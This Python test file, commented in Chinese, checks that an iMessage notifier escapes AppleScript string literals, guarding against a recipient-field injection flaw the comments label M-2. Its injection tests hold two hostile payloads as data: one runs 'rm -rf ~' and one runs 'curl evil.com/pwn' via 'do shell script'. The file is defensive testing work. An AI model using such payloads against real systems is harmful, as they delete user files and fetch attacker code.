"""
AppleScript 字面量转义 + iMessage notifier 的 _build_applescript。

关键：recipient 字段在 v1 实现里**没有转义**（M-2 安全发现）。
本测试同时验证 message 和 recipient 都正确转义，且修复有效。

为什么重要：
- recipient 来自 admin 在 Web 面板填写的 imessage_recipient
- 如果 admin 设了恶意字符串，旧实现会注入 AppleScript
- AppleScript 在 macOS 上能 `do shell script` 执行任意命令 → RCE
"""
from __future__ import annotations

import pytest

from notifier import _build_applescript, _escape_applescript_literal


# ─── 底层 helper: _escape_applescript_literal ──────────────────────────


class TestEscapeApplescriptLiteral:
    """转义顺序：\\\\ → " → \\n。顺序错了会出现二次转义灾难。"""

    def test_empty(self):
        assert _escape_applescript_literal("") == ""

    def test_plain_text(self):
        assert _escape_applescript_literal("hello world") == "hello world"

    def test_backslash_doubled(self):
        # \\ → \\\\（Python 字面量层面）
        # 即在 AppleScript 中显示为单个 \\
        assert _escape_applescript_literal("a\\b") == "a\\\\b"

    def test_double_quote_escaped(self):
        assert _escape_applescript_literal('say "hi"') == 'say \\"hi\\"'

    def test_newline_becomes_return_concat(self):
        # \\n → '" & return & "' 实现 AppleScript 字符串字面量内部换行
        assert _escape_applescript_literal("a\nb") == 'a" & return & "b'

    def test_order_backslash_first(self):
        """关键回归：反斜杠必须先转义，否则后续 \\" 会被再次转义。
        如果顺序错了，输入 'a"b' 会变成 'a\\\\\\"b'（双重 backslash）。"""
        result = _escape_applescript_literal('a"b')
        assert result == 'a\\"b', f"二次转义 bug: {result!r}"

    def test_order_quote_before_newline(self):
        """同时含 " 和 \\n：先转义 "，再处理 \\n。"""
        result = _escape_applescript_literal('x"y\nz')
        # 期望：x\"y" & return & "z
        assert result == 'x\\"y" & return & "z'

    def test_attack_payload_injection_blocked(self):
        """
        典型注入 payload —— 设法跳出字符串字面量执行恶意 AppleScript。
        转义后 " 变成 \\"，原本想"关闭字符串"的 " 失败。
        """
        attack = '"; do shell script "rm -rf ~"; --'
        escaped = _escape_applescript_literal(attack)
        # 转义后不应该出现"裸"双引号
        # 我们检查：开头的 " 必须是 \"（escaped），不是裸 "
        assert escaped.startswith('\\"'), f"escape failed at start: {escaped!r}"
        # 字符串中应该不存在未转义的 " 序列
        # 通过把所有 \\" 替换掉后剩余字符串中是否还有 "
        no_escaped = escaped.replace('\\"', '')
        assert '"' not in no_escaped, f"未转义双引号残留: {escaped!r}"


# ─── 高层 _build_applescript ─────────────────────────────────────────


class TestBuildApplescript:
    """组装完整 AppleScript：message + recipient 都必须经过转义。"""

    def test_normal_message_recipient(self):
        s = _build_applescript("+15551234567", "Hello world")
        # 健全性：包含 tell/send/buddy 关键字
        assert "tell application" in s
        assert 'send "Hello world"' in s
        assert 'to buddy "+15551234567"' in s

    def test_message_with_quote_and_newline(self):
        s = _build_applescript("a@b.com", 'Line1\nSay "hi"')
        # message 里的 " 必须转义
        assert 'Say \\"hi\\"' in s
        # \n 转成 " & return & "
        assert "Line1" in s
        assert "return" in s

    def test_recipient_quote_escaped(self):
        """
        M-2 安全发现：旧实现 recipient 字段直接拼，没有转义。
        修复后：recipient 中的 " 必须转义为 \\"。
        """
        s = _build_applescript('foo"bar', "msg")
        # recipient 字段里原来的 " 在 AppleScript 中必须以 \\" 形式出现
        assert 'foo\\"bar' in s, f"recipient 双引号未转义: {s}"
        # 反向：没有"裸 foo"bar"出现（说明边界未被打破）
        assert 'foo"bar' not in s.replace('foo\\"bar', '<ESC>'), (
            f"recipient 残留未转义双引号: {s}"
        )

    def test_recipient_with_shell_injection_attempt_neutralized(self):
        """
        完整注入演示：旧版会让 evil_recipient 跳出 buddy "..." 边界
        在 AppleScript 代码位置注入 `do shell script "rm -rf ~"`，
        造成 RCE（osascript 进程权限 = monitor.py 用户权限）。

        策略：剥离所有合法的 AppleScript 字符串字面量后，
        恶意 token (`do shell script`) 不能残留在剥光后的脚本里。
        如果残留 → 它在代码位置 → 真的能执行 → 测试失败。
        """
        import re

        evil = 'X"\ndo shell script "curl evil.com/pwn"\n'
        s = _build_applescript(evil, "msg")

        # 字面量保留：'do shell script' 应该还在脚本里（作为字符串内容）
        assert "do shell script" in s

        # 关键校验：剥离所有 "..." 字符串字面量（含转义的 \\"）后，
        # 'do shell script' 不应该残留 —— 残留 = 它在代码位置。
        # AppleScript 字面量正则：" 开始，内容是 \. 或非 "/\\ 的字符，" 结束
        stripped = re.sub(r'"(?:\\.|[^"\\])*"', '<STR>', s)
        assert "do shell script" not in stripped, (
            f"❌ RCE 风险：恶意 token 残留在代码位置\n"
            f"剥离字符串后的脚本: {stripped!r}"
        )

    def test_recipient_backslash_escaped(self):
        """recipient 含 \\ 也要转义，否则破坏后续 " 的转义。"""
        s = _build_applescript("foo\\bar", "msg")
        # AppleScript 里 \\ 表示单个反斜杠
        assert "foo\\\\bar" in s

    def test_backslash_in_message_doesnt_break_escaping(self):
        """message 含反斜杠 —— 反斜杠转义必须最先发生。"""
        s = _build_applescript("a@b.com", "C:\\path\\to\\file")
        # 反斜杠 \\ 在 AppleScript 字面量中要写成 \\\\
        assert "C:\\\\path\\\\to\\\\file" in s

    def test_idempotent_safe_input(self):
        """普通输入两次调用结果完全一致（无随机性）。"""
        s1 = _build_applescript("a@b.com", "hi")
        s2 = _build_applescript("a@b.com", "hi")
        assert s1 == s2
